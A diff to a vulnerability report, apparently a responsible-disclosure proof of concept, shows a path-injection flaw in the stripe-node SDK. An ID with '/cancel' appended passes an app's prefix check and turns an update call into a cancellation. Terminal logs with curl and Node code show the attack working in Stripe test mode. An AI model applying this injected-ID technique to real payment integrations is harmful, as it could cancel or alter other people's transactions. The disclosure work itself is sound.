@@ -178,7 +178,7 @@ stripeMock.listen(4242, () => {
 NODE
 ```
  
-### Expected Output
+### Output
  
 ```
 [App check passed] pi_attacker/cancel
@@ -191,3 +191,106 @@ NODE
 2. App's `id.startsWith("pi_")` validation passed.
 3. The SDK converted the attacker's `id` into a different route.
 4. Stripe receives `POST /v1/payment_intents/:id/cancel`, not the intended update route.
+
+
+### More tests:
+
+```bash
+[keshavgoyal@hazelnut stripe-node]$ export STRIPE_TEST_SECRET_KEY='sk_test_key'
+
+
+[keshavgoyal@hazelnut stripe-node]$ case "$STRIPE_TEST_SECRET_KEY" in
+  sk_test_*) echo "Using test key";;
+  *) echo "STOP: this is not a test secret key";;
+esac
+Using test key
+
+
+[keshavgoyal@hazelnut stripe-node]$ CREATE_RESPONSE=$(curl -sS https://api.stripe.com/v1/payment_intents \
+  -u "$STRIPE_TEST_SECRET_KEY:" \
+  -d amount=1000 \
+  -d currency=usd \
+  -d "metadata[poc]"="stripe-node-path-injection" \
+  -d "metadata[disposable]"="true")
+
+
+[keshavgoyal@hazelnut stripe-node]$ PI_ID=$(printf '%s' "$CREATE_RESPONSE" | node -e "
+let s='';
+process.stdin.on('data', d => s += d);
+process.stdin.on('end', () => {
+  const o = JSON.parse(s);
+  if (o.error) {
+    console.error(o.error.message);
+    process.exit(1);
+  }
+  console.log(o.id);
+});
+")
+echo "$PI_ID"
+pi_3TQHMdFi97flIn7U03C3eOyN
+
+
+
+[keshavgoyal@hazelnut stripe-node]$ curl -sS "https://api.stripe.com/v1/payment_intents/$PI_ID" \
+  -u "$STRIPE_TEST_SECRET_KEY:" \
+| node -e "
+let s='';
+process.stdin.on('data', d => s += d);
+process.stdin.on('end', () => {
+  const o = JSON.parse(s);
+  console.log({id: o.id, status: o.status, livemode: o.livemode});
+});
+"
+{
+  id: 'pi_3TQHMdFi97flIn7U03C3eOyN',
+  status: 'requires_payment_method',
+  livemode: false
+}
+
+[keshavgoyal@hazelnut stripe-node]$ node <<'NODE'
+const Stripe = require('./cjs/stripe.cjs.node.js');
+
+const stripe = Stripe(process.env.STRIPE_TEST_SECRET_KEY, {
+  maxNetworkRetries: 0,
+});
+
+(async () => {
+  const id = process.env.PI_ID + '/cancel';
+
+  try {
+    await stripe.paymentIntents.update(id, {
+      cancellation_reason: 'abandoned',
+    });
+  } catch (e) {
+    console.log('statusCode:', e.statusCode);
+    console.log('type:', e.type);
+    console.log('message:', e.message);
+    console.log('requestId:', e.requestId);
+  }
+})();
+NODE
+statusCode: 400
+type: StripeInvalidRequestError
+message: You cannot cancel this PaymentIntent because it has a status of canceled. Only a PaymentIntent with one of the following statuses may be canceled: requires_payment_method, requires_capture, requires_reauthorization, requires_confirmation, requires_action, processing.
+requestId: req_SRE4uu78URHMk7
+
+
+
+[keshavgoyal@hazelnut stripe-node]$ curl -sS "https://api.stripe.com/v1/payment_intents/$PI_ID" \
+  -u "$STRIPE_TEST_SECRET_KEY:" \
+| node -e "
+let s='';
+process.stdin.on('data', d => s += d);
+process.stdin.on('end', () => {
+  const o = JSON.parse(s);
+  console.log({id: o.id, status: o.status, livemode: o.livemode});
+});
+"
+{
+  id: 'pi_3TQHMdFi97flIn7U03C3eOyN',
+  status: 'canceled',
+  livemode: false
+}
+
+
+```
